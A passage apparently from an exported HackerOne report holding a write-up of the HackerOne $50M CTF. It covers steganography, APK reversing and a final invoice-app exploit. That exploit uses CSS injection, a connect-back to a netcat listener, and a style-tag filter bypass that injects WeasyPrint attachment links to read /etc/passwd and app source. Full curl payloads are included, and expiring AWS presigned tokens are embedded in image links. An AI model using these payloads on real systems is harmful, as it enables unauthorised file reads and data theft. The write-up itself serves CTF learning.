href=\"/\"\u003eHome\u003c/a\u003e\n      \u003c/li\u003e\n      \u003cli  class=\"nav-item\" \u003e\n        \u003ca class=\"nav-link\" href=\"/reports\"\u003eReports\u003c/a\u003e\n      \u003c/li\u003e\n      \u003cli  class=\"nav-item active\" \u003e\n        \u003ca class=\"nav-link\" href=\"/invoices\"\u003eInvoices\u003c/a\u003e\n      \u003c/li\u003e\n      \u003c!--\u003cli  class=\"nav-item\" \u003e\n        \u003ca class=\"nav-link\" href=\"/invoices/new\"\u003eNew Invoice\u003c/a\u003e\n      \u003c/li\u003e--\u003e\n```\n\nWe can modify the Invoice data and then generate a HTML preview or a PDF. Investigating the parameters to the request. I investigated\nthe parameters to the request to see what we could modify and exploit.\n\n```json\n{\n    \"companyName\": \"Acme Tools\",\n    \"email\": \"accounting@acme.com\",\n    \"invoiceNumber\": \"0001\",\n    \"date\": \"2019-04-01\",\n    \"items\": [\n        [\"1\", \"Test\", \"Test\", \"10\"]\n    ],\n    \"styles\": {\n        \"body\": {\n            \"background-color\": \"white\"\n        }\n    }\n}\n```\n\nI tried modifying the CSS background property to a image which was hosted on a server controlled by me and I got a connect back.\n\n```sh\n## background: url('http://45.77.200.226:3002');\nroot@vultr:~# nc -l -v -p 3002\nListening on [0.0.0.0] (family 0, port 3002)\nConnection from 98.12.196.104.bc.googleusercontent.com 35548 received!\nGET / HTTP/1.1\nHost: 45.77.200.226:3002\nUser-Agent: WeasyPrint 44 (http://weasyprint.org/)\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: close\n```\n\nNow I know that the server is using the WeasyPrint library to convert the HTML to PDF. From here, I spent a lot of time on trying to mess with SVGs\nused in the background, and try to extract files out of the file system, but nothing worked.\n\nAfter giving up on the SVG track, I tried reading the source code of the WeasyPrint library to try and find something I could use. I found a feature that allowed\nme to insert attachments into the pdf.\n\n```py\n# https://github.com/Kozea/WeasyPrint/blob/master/weasyprint/html.py#L307\nelif element.tag == 'link' and element_has_link_type(\n        element, 'attachment'):\n    url = get_url_attribute(element, 'href', base_url)\n    title = element.get('title', None)\n    if url is None:\n        LOGGER.error('Missing href in \u003clink rel=\"attachment\"\u003e')\n    else:\n        attachments.append((url, title))\n```\n\nTo test my theory, I created a simple HTML file and converted it to a PDF using `WeasyPrint`.\n\n```sh\n$ cat test.html\n\u003clink rel=\"attachment\" href=\"file:///etc/passwd\"\u003e\n$ weasyprint test.html test.pdf -v\nINFO: Step 1 - Fetching and parsing HTML - test.html\nINFO: Step 3 - Applying CSS\nINFO: Step 4 - Creating formatting structure\nINFO: Step 5 - Creating layout - Page 1\nINFO: Step 6 - Drawing\nINFO: Step 7 - Adding PDF metadata\n```\n\nOpening the PDF in the browser, I found the `passwd` file in the attachments!\n\n{F439435}\n\n\nSo now if I could somehow inject a link tag into the HTML that was generated by preview, I would have LFI on the system.\nI tried searching for inputs that were not sanitized, and I found one in the attribute-name in the CSS styles.\n\n```html\n$ curl 'http://4eefcea7.ngrok.io/invoices/preview' -G --data-urlencode 'd={\"companyName\":\"\u003e\",\"email\":\"\u003e\",\"invoiceNumber\":\"\u003e\",\"date\":\"\u003e\",\"items\":[[\"1.5500\",\"\u003e\",\"\u003e\",\"10\"]],\"styles\":{\"\u003e\":{\"\u003e\":\"\u003e\"}}}'\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n...\n...\n...\n  \u003cstyle\u003e\n    .invoice-title h2, .invoice-title h3 {\n      display: inline-block;\n    }\n    .table \u003e tbody \u003e tr \u003e .no-line {\n      border-top: none;\n    }\n    .table \u003e thead \u003e tr \u003e .no-line {\n      border-bottom: none;\n    }\n    .table \u003e tbody \u003e tr \u003e .thick-line {\n      border-top: 2px solid;\n    }\n    \u0026gt; {\n      \u003e: \u0026gt;;\n    }\n  \u003c/style\u003e\n  \u003cdiv class=\"row\"\u003e\n    \u003cdiv class=\"col-xs-12\"\u003e\n      \u003cdiv class=\"invoice-title\"\u003e\n        \u003ch2\u003eInvoice\u003c/h2\u003e\u003ch3 class=\"pull-right\"\u003e# \u0026gt;\u003c/h3\u003e\n      \u003c/div\u003e\n      \u003chr\u003e\n      \u003cdiv class=\"row\"\u003e\n        \u003cdiv class=\"col-xs-6\"\u003e\n          \u003caddress\u003e\n            \u003cstrong\u003eBilled To:\u003c/strong\u003e\u003cbr\u003e\n            \u0026gt;\u003cbr\u003e\n            \u0026gt;\n          \u003c/address\u003e\n        \u003c/div\u003e\n      \u003c/div\u003e\n...\n...\n...\n```\n\nI tried to close the style tag, so that it would allow me to inject raw HTML, however the parser was completely filtering any closing tags.\nSo I used a common XSS filter evasion trick and wrapped the closing style tag with another closing style that: `\u003c/st\u003c/style\u003eyle\u003e`\nThat seemed to work.\n\nI used the injection to extract the `/app/main.py` file which should be the source code of the app.\n\n```\n$ curl 'http://4eefcea7.ngrok.io/invoices/preview' -G --data-urlencode 'd={\"companyName\":\"\u003e\",\"email\":\"\u003e\",\"invoiceNumber\":\"\u003e\",\"date\":\"\u003e\",\"items\":[[\"1.5500\",\"\u003e\",\"\u003e\",\"10\"]],\"styles\":{\"a\":{\"} \u003c/st\u003c/style\u003eyle\u003e \u003clink rel=''attachment'' href=''file:///app/main.py''\u003e \":\"a\"}}}'\n...\n...\n    a {\n      } \u003c/style\u003e \u003clink rel='attachment' href='file:///app/main.py'\u003e : a;\n    }\n  \u003c/style\u003e\n...\n...\n```\n\nThe preview looked good, and pdfize returned the pdf with the source code in the attachment!\n\n\n```py\n\"\"\"\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!\n\nCongratulations again, and I'm sorry for the red herrings. :)\n\"\"\"\n\nfrom flask import Flask, abort, redirect, render_template, request, Response\nfrom jinja2 import Template\nfrom weasyprint import HTML\nimport base64, json, os, random, re\n```\n\n\nThanks for the great CTF! Even through it was a bit frustrating at times, I learnt a lot from it.\n\n## Impact\n\nI had shell on the machines, I also finished the CTF.","vulnerability_information_html":"\u003cp\u003eCTF Code: c8889970d9fb722066f31e804e351993\u003c/p\u003e\n\n\u003ch1 id=\"hackerone-50m-ctf-write-up\"\u003eHackerOne $50M CTF Write-Up\u003c/h1\u003e\n\n\u003cp\u003eI came across this \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FHacker0x01%2Fstatus%2F1100543680383832065\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003etweet\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e announcing the HackerOne CTF for invitations\u003cbr\u003e\nto the HackerOne event in Vegas during DEFCON. I tried searching for a URL for the CTF, but couldn\u0026#39;t find anything online, so I assumed\u003cbr\u003e\nthat the first challenge was the tweet itself.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"tweet.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/432/a15822e09875f0ff7dbc8d3e5e9d72a52144db5d/tweet.png?response-content-disposition=attachment%3B%20filename%3D%22tweet.png%22%3B%20filename%2A%3DUTF-8%27%27tweet.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061159Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026amp;X-Amz-Signature=22fb6304b580a3d4e20dfd00e89d2d7259f25631e5781d991488b0a6e8014cda\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/432/a15822e09875f0ff7dbc8d3e5e9d72a52144db5d/tweet.png?response-content-disposition=attachment%3B%20filename%3D%22tweet.png%22%3B%20filename%2A%3DUTF-8%27%27tweet.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061159Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026amp;X-Amz-Signature=22fb6304b580a3d4e20dfd00e89d2d7259f25631e5781d991488b0a6e8014cda\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"stage-1-steganography\"\u003eStage 1 - Steganography\u003c/h2\u003e\n\n\u003cp\u003eThe first thing that I noticed was the second image in the tweet with a lot of binary numbers.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"D0XoThpW0AE2r8S.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/431/cfe01f9a753eedf44f109caeda5182be92b81f94/D0XoThpW0AE2r8S.png?response-content-disposition=attachment%3B%20filename%3D%22D0XoThpW0AE2r8S.png%22%3B%20filename%2A%3DUTF-8%27%27D0XoThpW0AE2r8S.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061159Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026amp;X-Amz-Signature=c833a85359dbfe851206f891ec391fba6c70cfab4a986fd33f68060831f4933e\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/431/cfe01f9a753eedf44f109caeda5182be92b81f94/D0XoThpW0AE2r8S.png?response-content-disposition=attachment%3B%20filename%3D%22D0XoThpW0AE2r8S.png%22%3B%20filename%2A%3DUTF-8%27%27D0XoThpW0AE2r8S.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061159Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026amp;X-Amz-Signature=c833a85359dbfe851206f891ec391fba6c70cfab4a986fd33f68060831f4933e\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAt first, I tried to write a script that would cut up the image evenly into images of around 20 pixels by 8 pixels to try to extract each digit,\u003cbr\u003e\nbut that didn\u0026#39;t work out because the digits were not of uniform length.\u003c/p\u003e\n\n\u003cp\u003eThen I tried to convert the first line by hand to see if I got something meaningful. I got the first 4 characters as \u003ccode\u003ezlib\u003c/code\u003e and then some binary\u003cbr\u003e\ndata, which was very difficult to obtain accurately, so I gave up on that method.\u003c/p\u003e\n\n\u003cp\u003eLast, I tried to run the tool \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fzed-0xff%2Fzsteg\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ezsteg\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e on the image, and it gave me a link hidden in the image.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003ezsteg \u003cspan class=\"nt\"\u003e-a\u003c/span\u003e D0XoThpW0AE2r8S.png\n...\n...\nb4,b,lsb,xy,prime   .. text: \u003cspan class=\"s2\"\u003e\u0026quot;g\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e2Dc\u0026amp;HEu\u003cspan class=\"s2\"\u003e\u0026quot;\nb4,rgb,lsb,xy,prime .. text: \u0026quot;\u003c/span\u003ek\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003eFPg\u0026amp;uR\u003cspan class=\"s2\"\u003e\u0026quot;\nb4,bgr,lsb,xy,prime .. text: \u0026quot;\u003c/span\u003e62uGdubSw%\u003cspan class=\"s2\"\u003e\u0026quot;\nb6,bgr,lsb,xy,prime .. text: \u0026quot;\u003c/span\u003eYETYEWUU\u003cspan class=\"s2\"\u003e\u0026quot;\nb7,b,msb,xy,prime   .. text: \u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e4:M \u0026amp;Q\u003cspan class=\"o\"\u003e(\u003c/span\u003e42\u003cspan class=\"s2\"\u003e\u0026quot;\nb1,rgb,lsb,yx       .. zlib: data=\u0026quot;\u003c/span\u003ehttps://bit.do/h1therm\u003cspan class=\"s2\"\u003e\u0026quot;, offset=5, size=22\nb2,rgb,lsb,yx       .. file: PGP\u003c/span\u003e\u003cspan class=\"se\"\u003e\\0\u003c/span\u003e\u003cspan class=\"s2\"\u003e11Secret Sub-key -\nb3,r,lsb,yx         .. text: \u0026quot;\u003c/span\u003eQ.L\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e4Af^\u003cspan class=\"s2\"\u003e\u0026quot;\nb4,rgb,lsb,yx       .. text: \u0026quot;\u003c/span\u003e|xKKznZb\u003cspan class=\"s2\"\u003e\u0026quot;\nb7,g,msb,yx         .. text: \u0026quot;\u003c/span\u003ergZfcQD\u0026lt;\u003cspan class=\"s2\"\u003e\u0026quot;\nb8,r,lsb,yx         .. text: \u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e6?727:3\u003cspan class=\"s2\"\u003e\u0026quot;\n...\n...\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"stage-2-apk-reversing\"\u003eStage 2 - APK Reversing\u003c/h2\u003e\n\n\u003cp\u003eThe \u003ccode\u003ebit.do\u003c/code\u003e link from the PNG redirected me to a \u003ca href=\"/redirect?url=https%3A%2F%2Fdrive.google.com%2Ffile%2Fd%2F1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ%2Fview\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003egoogle drive link\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nwith a APK file called \u003ccode\u003eh1thermostat.apk\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eI loaded the apk file in a APK decompiler called \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fskylot%2Fjadx\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eJADX\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e that gives us the Java source code for the Android app.\u003cbr\u003e\nInside JADX, I could see a overview of the various activities related to the Thermostat App.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"jadx-overview.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/433/bf3df189e3b5b384a821356769d6b6a7a1452f91/jadx-overview.png?response-content-disposition=attachment%3B%20filename%3D%22jadx-overview.png%22%3B%20filename%2A%3DUTF-8%27%27jadx-overview.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061159Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdPDmPj8jrIy0bzAIMzEhANIb5ri2Nz0%2FfFqmnJ3rjk8e005Fnv5uK088J0m7HFCYIe7hgj40pmM5UNmkGs30hxAnycAlyRaDL94ttdw5SqAS%2FW4MMrRVIliym5o9kruL0SoyWZC0kQciksSypgYXswzm%2BAeZve49Cnzr6ikwTN3S7tncfj0WMJznDG890QvBL3O7QjntIQ6Hf9oANAQjphy38wZSi3%2FB45i5bX5Kr2E9NKFLEy5UWui5G%2BmfVfaVyg%3D%3D\u0026amp;X-Amz-Signature=9b1e5f52dcbef922780298fd782d61a14bbc05631a80c4a404fcca1baec479a9\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/433/bf3df189e3b5b384a821356769d6b6a7a1452f91/jadx-overview.png?response-content-disposition=attachment%3B%20filename%3D%22jadx-overview.png%22%3B%20filename%2A%3DUTF-8%27%27jadx-overview.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ3Q6GNRX4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061159Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB%2F4DOSXz4Uk7JQqVyIKOhXYFqWTxcD44Z3HdHcn0dvKAiEA3PYdLzeI5Kv3E9WFbSVqd%2BUBlw0212Xg7H3tNiixN5gqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDIUObNP5fEX8bJXBsSqRA%2BL7Z0plmhSxsMHnrb83ftPuhWkgvNoQbpQ66ErJF8Tab4HbvnqeuplpQgE7hhKtqBYOEsdafEq0r9zNmqA7m92b%2BxDq63GNbNVm2hS%2FrGlDOjkNPC4s9Y9jvsKbOyEaodYyGTaNp7nXzoPtsVsXWu3VzjV5rY1%2FOniQ2%2B1s8ySEdTjZaRHk8P%2FwXbNfsl1hT2TAe2rleD%2BZ%2BVAaUzHyFNU%2F1mQkQNOozyUs%2B0kWyLXo4oDuk2v6G%2B%2B%2BOffGDFiu%2F5vFGTwCcw9LcpG50TBnwx2MYUfVFlGDhzFRqqeFnE8%2BVLdMRhVxgbXYhePjinuq12WCpDVAhCJNj8IR3wEJ1%2FQoonHq3u3s4Fjef1%2Bw%2BXtypskg56dqBrrGLe95zM0RechJC4u4kZN3x7RKFnUe%2BQTgA2fsU4g%2FeYbY51bNGPKZw3ELWdMZpvEwvawS7vQJcERLBBN%2FFBpdyPI7tU9GTieNVwCAMdziMkUN3bUc%2BsG8%2BbAIpsp1R0fqA4Zzh1fBBmHnAwvAA0nggtgLe0MkU7v1MNiFq%2F8FOusBRvYvRZdkMedUg2M4tNHIP5rUiGXbyy3g4wRqI3QxmX%2FtfXzpLdSUg3BMdP